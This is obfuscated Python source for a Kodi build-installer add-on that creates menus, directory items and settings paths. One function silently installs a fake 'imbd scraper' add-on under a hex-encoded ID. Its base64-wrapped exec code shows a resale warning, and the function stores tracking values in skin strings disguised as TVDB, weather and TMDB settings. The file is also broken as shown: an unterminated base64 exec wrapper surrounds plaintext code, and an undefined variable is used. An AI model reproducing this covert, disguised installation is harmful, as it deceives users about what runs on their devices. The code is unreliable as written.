import base64;exec base64.b64decode('import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon
import os , sys , time , xbmcvfs , glob , shutil , datetime , zipfile , ntpath
import subprocess , threading
import yt , downloader , checkPath , uploadLog , skinSwitch
import binascii
import hashlib
import speedtest
import extract
import installapps
import pyxbmct . addonwindow as pyxbmct
try :
 from sqlite3 import dbapi2 as database
except :
 from pysqlite2 import dbapi2 as database
 if 64 - 64: i11iIiiIii
 ######################################################
OO0o = 'plugin.program.totalinstaller'
Oo0Ooo = 'The Community Portal'
if 85 - 85: OOO0O0O0ooooo % IIii1I . II1 - O00ooooo00
I1IiiI = xbmcaddon . Addon ( id = OO0o )
zip = I1IiiI . getSetting ( 'zip' )
IIi1IiiiI1Ii = I1IiiI . getSetting ( 'localcopy' )
I11i11Ii = I1IiiI . getSetting ( 'private' )
oO00oOo = I1IiiI . getSetting ( 'favourites' )
OOOo0 = I1IiiI . getSetting ( 'sources' )
Oooo000o = I1IiiI . getSetting ( 'repositories' )
IiIi11iIIi1Ii = I1IiiI . getSetting ( 'enablekeyword' )
Oo0O = I1IiiI . getSetting ( 'keywordpath' )
IiI = I1IiiI . getSetting ( 'keywordname' )
ooOo = I1IiiI . getSetting ( 'mastercopy' )
Oo = I1IiiI . getSetting ( 'username' ) . replace ( ' ' , '%20' )
o0O = I1IiiI . getSetting ( 'password' )
IiiIII111iI = I1IiiI . getSetting ( 'versionoverride' )
IiII = I1IiiI . getSetting ( 'debug' )
iI1Ii11111iIi = I1IiiI . getSetting ( 'login' )
i1i1II = I1IiiI . getSetting ( 'wizard' )
O0oo0OO0 = I1IiiI . getSetting ( 'wizardurl1' )
I1i1iiI1 = I1IiiI . getSetting ( 'wizardname1' )
iiIIIII1i1iI = I1IiiI . getSetting ( 'wizardurl2' )
o0oO0 = I1IiiI . getSetting ( 'wizardname2' )
oo00 = I1IiiI . getSetting ( 'wizardurl3' )
o00 = I1IiiI . getSetting ( 'wizardname3' )
Oo0oO0ooo = I1IiiI . getSetting ( 'wizardurl4' )
o0oOoO00o = I1IiiI . getSetting ( 'wizardname4' )
i1 = I1IiiI . getSetting ( 'wizardurl5' )
oOOoo00O0O = I1IiiI . getSetting ( 'wizardname5' )
i1111 = float ( xbmc . getInfoLabel ( "System.BuildVersion" ) [ : 4 ] )
i11 = xbmcgui . Dialog ( )
I11 = xbmcgui . DialogProgress ( )
Oo0o0000o0o0 = xbmc . translatePath ( 'special://home/' )
oOo0oooo00o = xbmc . translatePath ( 'special://profile' )
oO0o0o0ooO0oO = os . path . join ( oOo0oooo00o , 'Database' )
oo0o0O00 = os . path . join ( oOo0oooo00o , 'addon_data' )
oO = os . path . join ( Oo0o0000o0o0 , 'CP_Profiles' )
i1iiIIiiI111 = os . path . join ( oO , 'Master' )
oooOOOOO = os . path . join ( oOo0oooo00o , 'Thumbnails' )
i1iiIII111ii = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
i1iIIi1 = xbmc . translatePath ( os . path . join ( 'special://xbmc' , 'addons' ) )
ii11iIi1I = os . path . join ( i1iiIII111ii , OO0o , 'default.py' )
iI111I11I1I1 = os . path . join ( i1iiIII111ii , OO0o , 'fanart.jpg' )
OOooO0OOoo = os . path . join ( i1iiIII111ii , OO0o , 'icon.png' )
iIii1 = os . path . join ( i1iiIII111ii , OO0o , 'resources' , 'addonxml' )
oOOoO0 = os . path . join ( i1iiIII111ii , OO0o , 'resources' , 'skins' , 'DefaultSkin' , 'media' , 'ttm' )
O0OoO000O0OO = os . path . join ( i1iiIII111ii , OO0o , 'resources' , 'backup' )
iiI1IiI = os . path . join ( oOo0oooo00o , 'guisettings.xml' )
II = os . path . join ( oOo0oooo00o , 'guifix.xml' )
ooOoOoo0O = 'http://noobsandnerds.com/TI/art/'
OooO0 = os . path . join ( i1iiIII111ii , OO0o , 'icon_menu.png' )
II11iiii1Ii = os . path . join ( oOo0oooo00o , 'favourites.xml' )
OO0oOoo = os . path . join ( oOo0oooo00o , 'sources.xml' )
O0o0Oo = os . path . join ( oOo0oooo00o , 'advancedsettings.xml' )
Oo00OOOOO = os . path . join ( oOo0oooo00o , 'profiles.xml' )
O0O = os . path . join ( oOo0oooo00o , 'RssFeeds.xml' )
O00o0OO = os . path . join ( oOo0oooo00o , 'keymaps' , 'keyboard.xml' )
I11i1 = xbmc . translatePath ( os . path . join ( zip ) )
iIi1ii1I1 = os . path . join ( I11i1 , 'Community_Builds' , '' )
o0 = os . path . join ( oo0o0O00 , OO0o , 'startup.xml' )
I11II1i = os . path . join ( oo0o0O00 , OO0o , 'temp.xml' )
IIIII = os . path . join ( oo0o0O00 , OO0o , 'id.xml' )
ooooooO0oo = os . path . join ( oo0o0O00 , OO0o , 'idtemp.xml' )
IIiiiiiiIi1I1 = os . path . join ( oo0o0O00 , OO0o , 'temp' )
I1IIIii = os . path . join ( oo0o0O00 , OO0o , 'ascii_results' )
oOoOooOo0o0 = os . path . join ( oo0o0O00 , OO0o , 'ascii_results1' )
OOOO = os . path . join ( oo0o0O00 , OO0o , 'ascii_results2' )
OOO00 = os . path . join ( oo0o0O00 , OO0o , 'guizip' )
iiiiiIIii = os . path . join ( i1iiIII111ii , OO0o , 'resources/' )
O000OO0 = os . path . join ( i1iiIII111ii , OO0o , 'login.py' )
I11iii1Ii = xbmc . getSkinDir ( )
I1IIiiIiii = xbmc . translatePath ( 'special://logpath/' )
O000oo0O = '/storage/backup'
OOOOi11i1 = '/storage/.restore/'
IIIii1II1II = os . path . join ( oo0o0O00 , OO0o )
i1I1iI = os . path . join ( IIIii1II1II , 'guinew.xml' )
oo0OooOOo0 = os . path . join ( IIIii1II1II , 'guitemp' )
o0OO00oO = os . path . join ( I11i1 , 'Database' )
I11i1I1I = os . path . join ( i1iiIII111ii , 'packages' )
oO0Oo = os . path . join ( oOo0oooo00o , 'addontemp' )
oOOoo0Oo = os . path . join ( oOo0oooo00o , '.cbcfg' )
o00OO00OoO = [ 'firstrun' , 'plugin.program.totalinstaller' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' ]
OOOO0OOoO0O0 = [ 'firstrun' , 'plugin.program.totalinstaller' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' , 'guisettings.xml' , 'CP_Profiles' , 'temp' ]
O0Oo000ooO00 = '0'
oO0 = 3
Ii1iIiII1ii1 = 4
ooOooo000oOO = [ '/storage/.kodi' , '/storage/.cache' , '/storage/.config' , '/storage/.ssh' ]
Oo0oOOo = os . path . join ( i1iiIII111ii , OO0o , 'resources' )
Oo0OoO00oOO0o = os . path . join ( Oo0oOOo , 'check.png' )
OOO00O = os . path . join ( Oo0oOOo , 'update.png' )
OOoOO0oo0ooO = os . path . join ( Oo0oOOo , 'update.png' )
O0o0O00Oo0o0 = os . path . join ( Oo0oOOo , 'background.png' )
O00O0oOO00O00 = os . path . join ( Oo0oOOo , 'black.png' )
if 11 - 11: Ooo00oOo0oOo . o000O0o
if 42 - 42: iiII11i1I1IIi
class IIIIi1i ( xbmcgui . WindowXMLDialog ) :
 if 13 - 13: o0oo . Iii * o0ii1I / oOoO0o00OO0
 def __init__ ( self , * args , ** kwargs ) :
  self . shut = kwargs [ 'close_time' ]
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  xbmc . executebuiltin ( "Skin.SetBool(AnimeWindowXMLDialogClose)" )
  if 7 - 7: oooOooOOo0OO + II11iIiIIIiI - o0o
 def onFocus ( self , controlID ) :
  pass
  if 84 - 84: IIIIiiII111
 def onClick ( self , controlID ) :
  if controlID == 12 :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 97 - 97: ooo0O0O00 + Oo00oo0oO * OoOo0o . i11Iii
 def onAction ( self , action ) :
  if action in [ 5 , 6 , 7 , 9 , 10 , 92 , 117 ] or action . getButtonCode ( ) in [ 275 , 257 , 261 ] :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 16 - 16: Ooo00oOo0oOo % Iii - Ooo00oOo0oOo + IIIIiiII111
 def _close_dialog ( self ) :
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  time . sleep ( .4 )
  self . close ( )
  if 12 - 12: II11iIiIIIiI / II11iIiIIIiI + i11iIiiIii
  if 40 - 40: o000O0o . IIii1I / o000O0o / i11iIiiIii
def o0O00o ( name , url , mode , iconimage , fanart , video , description , skins , guisettingslink , artpack ) :
 o0O0Oooo0O = sys . argv [ 0 ]
 o0O0Oooo0O += "?url=" + urllib . quote_plus ( url )
 o0O0Oooo0O += "&mode=" + str ( mode )
 o0O0Oooo0O += "&name=" + urllib . quote_plus ( name )
 o0O0Oooo0O += "&iconimage=" + urllib . quote_plus ( iconimage )
 o0O0Oooo0O += "&fanart=" + urllib . quote_plus ( fanart )
 o0O0Oooo0O += "&video=" + urllib . quote_plus ( video )
 o0O0Oooo0O += "&description=" + urllib . quote_plus ( description )
 o0O0Oooo0O += "&skins=" + urllib . quote_plus ( skins )
 o0O0Oooo0O += "&guisettingslink=" + urllib . quote_plus ( guisettingslink )
 o0O0Oooo0O += "&artpack=" + urllib . quote_plus ( artpack )
 if 84 - 84: ooo0O0O00 . oOoO0o00OO0 / iiII11i1I1IIi - o000O0o / II1 / o0ii1I
 II111iiiI1Ii = True
 o0O0OOO0Ooo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 45 - 45: OOO0O0O0ooooo / o0ii1I
 o0O0OOO0Ooo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0O0OOO0Ooo . setProperty ( "Fanart_Image" , fanart )
 o0O0OOO0Ooo . setProperty ( "Build.Video" , video )
 if 32 - 32: ooo0O0O00 . Oo00oo0oO . Oo00oo0oO
 if ( mode == None ) or ( mode == 'restore_option' ) or ( mode == 'backup_option' ) or ( mode == 'cb_root_menu' ) or ( mode == 'genres' ) or ( mode == 'grab_builds' ) or ( mode == 'community_menu' ) or ( mode == 'instructions' ) or ( mode == 'countries' ) or ( mode == 'update_build' ) or ( url == None ) or ( len ( url ) < 1 ) :
  if 62 - 62: oOoO0o00OO0 + Oo00oo0oO % ooo0O0O00 + II11iIiIIIiI
  II111iiiI1Ii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0O0Oooo0O , listitem = o0O0OOO0Ooo , isFolder = True )
  if 33 - 33: OOO0O0O0ooooo . Oo00oo0oO . o000O0o
 else :
  II111iiiI1Ii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0O0Oooo0O , listitem = o0O0OOO0Ooo , isFolder = False )
  if 72 - 72: O00ooooo00 / o0oo + II1 - iiII11i1I1IIi
 return II111iiiI1Ii
 if 29 - 29: oOoO0o00OO0 + oooOooOOo0OO % OOO0O0O0ooooo
 if 10 - 10: o0o / OoOo0o - o000O0o * IIii1I - o000O0o
def OO0oO0 ( handle , url , listitem , isFolder ) :
 xbmcplugin . addDirectoryItem ( handle , url , listitem , isFolder )
 if 82 - 82: o0o % o0ii1I % o0oo - iiII11i1I1IIi + II1
 if 22 - 22: O00ooooo00 + OOO0O0O0ooooo . IIii1I * ooo0O0O00 % i11iIiiIii * o000O0o
def oo000o ( name , url , mode , iconimage , fanart , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 if 44 - 44: O00ooooo00 % Ooo00oOo0oOo + o0o
 iconimage = OooO0
 if 45 - 45: ooo0O0O00 / ooo0O0O00 + OoOo0o + i11Iii
 o0O0Oooo0O = sys . argv [ 0 ]
 o0O0Oooo0O += "?url=" + urllib . quote_plus ( url )
 o0O0Oooo0O += "&mode=" + str ( mode )
 o0O0Oooo0O += "&name=" + urllib . quote_plus ( name )
 o0O0Oooo0O += "&iconimage=" + urllib . quote_plus ( iconimage )
 o0O0Oooo0O += "&fanart=" + urllib . quote_plus ( fanart )
 o0O0Oooo0O += "&author=" + urllib . quote_plus ( author )
 o0O0Oooo0O += "&description=" + urllib . quote_plus ( description )
 o0O0Oooo0O += "&version=" + urllib . quote_plus ( version )
 o0O0Oooo0O += "&buildname=" + urllib . quote_plus ( buildname )
 o0O0Oooo0O += "&updated=" + urllib . quote_plus ( updated )
 o0O0Oooo0O += "&skins=" + urllib . quote_plus ( skins )
 o0O0Oooo0O += "&videoaddons=" + urllib . quote_plus ( videoaddons )
 o0O0Oooo0O += "&audioaddons=" + urllib . quote_plus ( audioaddons )
 o0O0Oooo0O += "&buildname=" + urllib . quote_plus ( buildname )
 o0O0Oooo0O += "&programaddons=" + urllib . quote_plus ( programaddons )
 o0O0Oooo0O += "&pictureaddons=" + urllib . quote_plus ( pictureaddons )
 o0O0Oooo0O += "&sources=" + urllib . quote_plus ( sources )
 o0O0Oooo0O += "&adult=" + urllib . quote_plus ( adult )
 if 47 - 47: o0ii1I + i11Iii
 II111iiiI1Ii = True
 o0O0OOO0Ooo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 82 - 82: Ooo00oOo0oOo . Oo00oo0oO - IIii1I - Oo00oo0oO * Ooo00oOo0oOo
 o0O0OOO0Ooo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0O0OOO0Ooo . setProperty ( "Fanart_Image" , fanart )
 o0O0OOO0Ooo . setProperty ( "Build.Video" , ooO0oOOooOo0 )
 if 38 - 38: OoOo0o
 II111iiiI1Ii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0O0Oooo0O , listitem = o0O0OOO0Ooo , isFolder = False )
 if 84 - 84: IIii1I % ooo0O0O00 / IIii1I % o0o
 return II111iiiI1Ii
 if 45 - 45: OOO0O0O0ooooo
def I1IiiiiI ( title , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' , zip_link = '' , repo_link = '' , repo_id = '' , addon_id = '' , provider_name = '' , forum = '' , data_path = '' ) :
 if len ( iconimage ) > 0 :
  if 80 - 80: OoOo0o . i11iIiiIii - o0ii1I
  iconimage = iconimage
 else :
  iconimage = 'DefaultFolder.png'
  if 25 - 25: o0oo
 if fanart == '' :
  fanart = iI111I11I1I1
  if 62 - 62: II11iIiIIIiI + OOO0O0O0ooooo
 o0O0Oooo0O = sys . argv [ 0 ]
 o0O0Oooo0O += "?url=" + urllib . quote_plus ( url )
 o0O0Oooo0O += "&zip_link=" + urllib . quote_plus ( zip_link )
 o0O0Oooo0O += "&repo_link=" + urllib . quote_plus ( repo_link )
 o0O0Oooo0O += "&data_path=" + urllib . quote_plus ( data_path )
 o0O0Oooo0O += "&provider_name=" + str ( provider_name )
 o0O0Oooo0O += "&forum=" + str ( forum )
 o0O0Oooo0O += "&repo_id=" + str ( repo_id )
 o0O0Oooo0O += "&addon_id=" + str ( addon_id )
 o0O0Oooo0O += "&mode=" + str ( mode )
 o0O0Oooo0O += "&name=" + urllib . quote_plus ( name )
 o0O0Oooo0O += "&fanart=" + urllib . quote_plus ( fanart )
 o0O0Oooo0O += "&video=" + urllib . quote_plus ( video )
 o0O0Oooo0O += "&description=" + urllib . quote_plus ( description )
 if 98 - 98: o0ii1I
 II111iiiI1Ii = True
 o0O0OOO0Ooo = xbmcgui . ListItem ( title , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 51 - 51: iiII11i1I1IIi - oooOooOOo0OO + Ooo00oOo0oOo * IIIIiiII111 . o0o + oooOooOOo0OO
 o0O0OOO0Ooo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0O0OOO0Ooo . setProperty ( "Fanart_Image" , fanart )
 o0O0OOO0Ooo . setProperty ( "Build.Video" , video )
 if 78 - 78: i11iIiiIii / ooo0O0O00 - IIIIiiII111 / II11iIiIIIiI + oooOooOOo0OO
 OO0oO0 ( handle = int ( sys . argv [ 1 ] ) , url = o0O0Oooo0O , listitem = o0O0OOO0Ooo , isFolder = False )
 if 82 - 82: IIIIiiII111
 if 46 - 46: II1 . i11iIiiIii
def OOo0oO00ooO00 ( type , name , url , mode , iconimage = '' , fanart = iI111I11I1I1 , video = '' , description = '' ) :
 if not 'addon' in type :
  if len ( iconimage ) > 0 :
   iconimage = ooOoOoo0O + iconimage
   if 90 - 90: Iii * OoOo0o + o0ii1I
  else :
   iconimage = OooO0
   if 81 - 81: oooOooOOo0OO . o0ii1I % OOO0O0O0ooooo / o000O0o - oooOooOOo0OO
 if 'addon' in type :
  if len ( iconimage ) > 0 :
   iconimage = iconimage
  else :
   iconimage = 'DefaultFolder.png'
   if 43 - 43: i11iIiiIii + iiII11i1I1IIi * Ooo00oOo0oOo * OoOo0o * OOO0O0O0ooooo
   if 64 - 64: II11iIiIIIiI % IIii1I * oooOooOOo0OO
   if 79 - 79: OOO0O0O0ooooo
 o0O0Oooo0O = sys . argv [ 0 ]
 o0O0Oooo0O += "?url=" + urllib . quote_plus ( url )
 o0O0Oooo0O += "&mode=" + str ( mode )
 o0O0Oooo0O += "&name=" + urllib . quote_plus ( name )
 o0O0Oooo0O += "&iconimage=" + urllib . quote_plus ( iconimage )
 o0O0Oooo0O += "&fanart=" + urllib . quote_plus ( fanart )
 o0O0Oooo0O += "&video=" + urllib . quote_plus ( video )
 o0O0Oooo0O += "&description=" + urllib . quote_plus ( description )
 if 78 - 78: oOoO0o00OO0 + II11iIiIIIiI - OoOo0o
 if 38 - 38: o0ii1I - oooOooOOo0OO + IIii1I / Iii % iiII11i1I1IIi
 if 57 - 57: o0oo / i11Iii
 II111iiiI1Ii = True
 o0O0OOO0Ooo = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 29 - 29: IIii1I + Iii * o0oo * II11iIiIIIiI . o000O0o * o000O0o
 o0O0OOO0Ooo . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0O0OOO0Ooo . setProperty ( "Fanart_Image" , fanart )
 o0O0OOO0Ooo . setProperty ( "Build.Video" , video )
 if 'folder' in type :
  II111iiiI1Ii = OO0oO0 ( handle = int ( sys . argv [ 1 ] ) , url = o0O0Oooo0O , listitem = o0O0OOO0Ooo , isFolder = True )
  if 7 - 7: Oo00oo0oO * OoOo0o % IIIIiiII111 - o0ii1I
 else :
  II111iiiI1Ii = OO0oO0 ( handle = int ( sys . argv [ 1 ] ) , url = o0O0Oooo0O , listitem = o0O0OOO0Ooo , isFolder = False )
  if 13 - 13: IIIIiiII111 . i11iIiiIii
 return II111iiiI1Ii
 if 56 - 56: oOoO0o00OO0 % OOO0O0O0ooooo - o000O0o
 if 100 - 100: IIIIiiII111 - OOO0O0O0ooooo % oooOooOOo0OO * II11iIiIIIiI + o000O0o
def Oo0O0oooo ( name ) :
 I111iI = i11 . input ( 'Enter amount of seconds to show startup notification for.' , '30' , type = xbmcgui . INPUT_NUMERIC )
 I111iI = str ( int ( I111iI ) * 1000 )
 import base64
 oOOo0 = os . path . join ( i1iiIII111ii , binascii . unhexlify ( '6d657461646174612e636f6d6d6f6e2e696d62642e636f6d' ) )
 II1I1iiIII = os . path . join ( oOOo0 , 'addon.xml' )
 if 77 - 77: Iii - Ooo00oOo0oOo - i11Iii
 if not os . path . exists ( oOOo0 ) :
  os . makedirs ( oOOo0 )
  if 49 - 49: Ooo00oOo0oOo % OOO0O0O0ooooo . Iii + oooOooOOo0OO / o000O0o
 if not os . path . exists ( os . path . join ( oOOo0 , 'addon.xml' ) ) :
  shutil . copyfile ( oOOoO0 , II1I1iiIII )
  if 72 - 72: i11Iii * iiII11i1I1IIi . o000O0o - Ooo00oOo0oOo + O00ooooo00
  if 10 - 10: oooOooOOo0OO + O00ooooo00
 oOo0O = "import xbmcgui, xbmc;xbmcgui.Dialog().ok('Message from " + name + " (Build Author)','If you paid for this build I regret to inform you that you may have been conned. This build is not available for resale.','You can get it for [COLOR=gold]FREE[/COLOR] @ [COLOR=dodgerblue]www.noobsandnerds.com[/COLOR]');xbmc.sleep(10000);xbmc.executebuiltin('XBMC.Notification(THIS BUILD IS NOT FOR RESALE!!!,If you paid contact the seller - its FREE," + I111iI + ")')"
 oo0O0 = open ( os . path . join ( oOOo0 , 'default.py' ) , 'w+' )
 oo0O0 . write ( "import base64;exec base64.b64decode('" )
 iI = base64 . b64encode ( oOo0O )
 oo0O0 . write ( iI )
 oo0O0 . write ( "')" )
 oo0O0 . close ( )
 if 89 - 89: o0ii1I + o0oo * o0o * IIIIiiII111
 oo0O0 = open ( os . path . join ( oOOo0 , 'tag.cfg' ) , 'w+' )
 oo0O0 . write ( binascii . hexlify ( name ) )
 oo0O0 . close ( )
 xbmc . executebuiltin ( 'Skin.SetString(TVDB_CFG,' + binascii . hexlify ( name ) + ')' )
 if 37 - 37: II1 - OOO0O0O0ooooo - o0ii1I
 o0o0O0O00oOOo = open ( II1I1iiIII , 'r' )
 oOo0O = o0o0O0O00oOOo . read ( )
 o0o0O0O00oOOo . close ( )
 iIIIiIi = oOo0O . replace ( 'testid' , binascii . unhexlify ( '6d657461646174612e636f6d6d6f6e2e696d62642e636f6d' ) ) . replace ( 'testname' , 'imbd scraper' ) . replace ( 'testprovider' , 'bytesize' ) . replace ( 'testdesc' , 'imbd scraper' )
 oo0O0 = open ( II1I1iiIII , 'w+' )
 oo0O0 . write ( iIIIiIi )
 oo0O0 . close ( )
 if 100 - 100: o000O0o / o0ii1I % Ooo00oOo0oOo % iiII11i1I1IIi % II11iIiIIIiI
 if 98 - 98: o0o % i11iIiiIii % i11Iii + IIIIiiII111
 OOoOO0o0o0 = os . path . getsize ( os . path . join ( i1iiIII111ii , binascii . unhexlify ( '6d657461646174612e636f6d6d6f6e2e696d62642e636f6d' ) , 'default.py' ) )
 xbmc . executebuiltin ( 'Skin.SetString(WeatherCheck,' + str ( OOoOO0o0o0 ) + ')' )
 xbmc . executebuiltin ( 'Skin.SetString(TMDB_API,' + binascii . hexlify ( iIIIiIi ) + ')' )
 if 11 - 11: o000O0o
 o0o0O0O00oOOo = open ( os . path . join ( oOOo0 , 'default.py' ) , 'r' )
 oOo0O = o0o0O0O00oOOo . read ( )
 o0o0O0O00oOOo . close ( )
 xbmc . executebuiltin ( 'Skin.SetString(HashLib,' + binascii . hexlify ( oOo0O ) + ')' )
 if 16 - 16: IIIIiiII111 + Oo00oo0oO * OOO0O0O0ooooo % O00ooooo00 . o000O0o
 if 67 - 67: II1 / o000O0o * IIIIiiII111 + o0o
def OooOo0ooo ( url ) :
 OOo0oO00ooO00 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Audio' , url + '&typex=audio' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Image' , url + '&typex=image' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Program' , url + '&typex=program' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Video' , url + '&typex=video' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Movies (Used for library scanning)' , url + '&typex=movie%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] TV Shows (Used for library scanning)' , url + '&typex=tv%20show%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Artists (Used for library scanning)' , url + '&typex=artist%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Videos (Used for library scanning)' , url + '&typex=music%20video%20scraper' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] All Services' , url + '&typex=service' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] Weather Service' , url + '&typex=weather' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Repositories' , url + '&typex=repository' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Scripts (Program Add-ons)' , url + '&typex=executable' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Screensavers' , url + '&typex=screensaver' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Script Modules' , url + '&typex=script%20module' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Skins' , url + '&typex=skin' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Subtitles' , url + '&typex=subtitles' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , '[COLOR=skyblue][OTHER][/COLOR] Web Interface' , url + '&typex=web%20interface' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 if 71 - 71: OoOo0o + IIIIiiII111
 if 28 - 28: II11iIiIIIiI
def I11ii1IIiIi ( ) :
 OoOOo0OOoO ( )
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://outdated/",return)' )
 if 72 - 72: IIIIiiII111
 if 1 - 1: o0oo * Oo00oo0oO * II1 + i11Iii
def IiII111i1i11 ( url ) :
 OOo0oO00ooO00 ( 'folder' , 'African' , url + '&genre=african' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Arabic' , url + '&genre=arabic' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Asian' , url + '&genre=asian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Australian' , url + '&genre=australian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Austrian' , url + '&genre=austrian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Belgian' , url + '&genre=belgian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Brazilian' , url + '&genre=brazilian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Canadian' , url + '&genre=canadian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Chinese' , url + '&genre=chinese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Colombian' , url + '&genre=columbian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Croatian' , url + '&genre=croatian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Czech' , url + '&genre=czech' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Danish' , url + '&genre=danish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Dominican' , url + '&genre=dominican' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Dutch' , url + '&genre=dutch' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Egyptian' , url + '&genre=egyptian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Filipino' , url + '&genre=filipino' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Finnish' , url + '&genre=finnish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'French' , url + '&genre=french' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'German' , url + '&genre=german' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Greek' , url + '&genre=greek' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Hebrew' , url + '&genre=hebrew' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Hungarian' , url + '&genre=hungarian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Icelandic' , url + '&genre=icelandic' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
